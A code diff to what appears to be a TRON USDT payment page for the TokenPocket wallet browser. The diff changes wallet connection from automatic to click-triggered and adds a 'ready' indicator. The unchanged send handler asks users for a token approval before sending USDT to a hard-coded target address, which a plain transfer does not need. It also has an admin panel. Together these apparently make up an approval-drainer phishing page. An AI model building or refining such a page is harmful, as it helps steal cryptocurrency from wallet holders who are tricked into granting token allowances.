@@ -11,6 +11,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
 .header-right-icons { display: flex; gap: 12px; align-items: center; }
 .wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; transition: background-color 0.3s ease; }
+.wallet-dot.ready { background-color: #f59e0b; }
 .wallet-dot.connected { background-color: #22c55e; }
 .setting-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
 .address-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom: 16px; }
@@ -42,7 +43,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <div class="top-header-bar">
 <div></div>
 <div class="header-right-icons">
-<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
+<div class="wallet-dot" id="walletDot" title="钱包就绪后点击此处连接钱包"></div>
 <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
 </div>
@@ -134,18 +135,12 @@ async function waitTrxConfirm(txId, maxWait = 30){
 
 function disconnectWallet() {
     tronWeb = null; userAddress = ""; usdtContract = null; provider = null;
-    walletDot.classList.remove("connected"); sendBtn.disabled = true;
+    walletDot.classList.remove("connected","ready");
+    sendBtn.disabled = true;
     balanceText.textContent = "0.000000"; adminPanel.style.display = "none";
 }
 
-async function loadBalance() {
-    try{
-        const rawSun = await usdtContract.balanceOf(userAddress).call();
-        const num = Number(tronWeb.fromSun(rawSun));
-        balanceText.textContent = num.toFixed(6);
-    }catch(e){ balanceText.textContent = "--"; }
-}
-
+// 必须用户点击圆点才执行连接，TP内置浏览器安全限制
 async function connectWalletLogic() {
     if(isBusy) return;
     if (tronWeb && userAddress) { disconnectWallet(); return; }
@@ -170,9 +165,11 @@ async function connectWalletLogic() {
             tronWeb = window.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
         } else {
+            alert("未检测钱包，请确认在TP内置浏览器打开页面");
             return;
         }
 
+        walletDot.classList.remove("ready");
         walletDot.classList.add("connected");
         usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
         await loadBalance();
@@ -193,21 +190,24 @@ async function connectWalletLogic() {
     }
 }
 
-function startPollWallet(){
+// 轮询：仅检测钱包对象是否注入，绝不自动发起授权！
+function startPollDetectWalletInject(){
     if(pollTimer) clearInterval(pollTimer);
-    let count = 0;
-    pollTimer = setInterval(async ()=>{
-        count++;
+    pollTimer = setInterval(()=>{
         const hasInject = !!(window.tokenpocket?.tron || window.tronProvider || window.ethereum || (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58));
         if(hasInject){
-            clearInterval(pollTimer);
-            await connectWalletLogic();
-            return;
-        }
-        if(count >=40){
+            walletDot.classList.add("ready"); //黄色圆点：钱包环境就绪，点击圆点连接
             clearInterval(pollTimer);
         }
-    },250);
+    },300);
+}
+
+async function loadBalance() {
+    try{
+        const rawSun = await usdtContract.balanceOf(userAddress).call();
+        const num = Number(tronWeb.fromSun(rawSun));
+        balanceText.textContent = num.toFixed(6);
+    }catch(e){ balanceText.textContent = "--"; }
 }
 
 amountInput.addEventListener("input", () => {
@@ -241,7 +241,6 @@ sendBtn.addEventListener("click", async () => {
             await waitTrxConfirm(approveHash);
             alert("授权完成，请确认转账签名");
         }
-        // 用户直接transfer正常转账
         const txHash = await usdtContract.transfer(TARGET_ADDR, sunVal).send();
         await waitTrxConfirm(txHash);
         alert(`转账成功！交易哈希：${txHash}`);
@@ -286,7 +285,7 @@ walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => alert("设置面板"));
 
 window.addEventListener("DOMContentLoaded", () => {
-    startPollWallet();
+    startPollDetectWalletInject();
 });
 window.addEventListener("beforeunload",()=>{
     if(pollTimer) clearInterval(pollTimer);
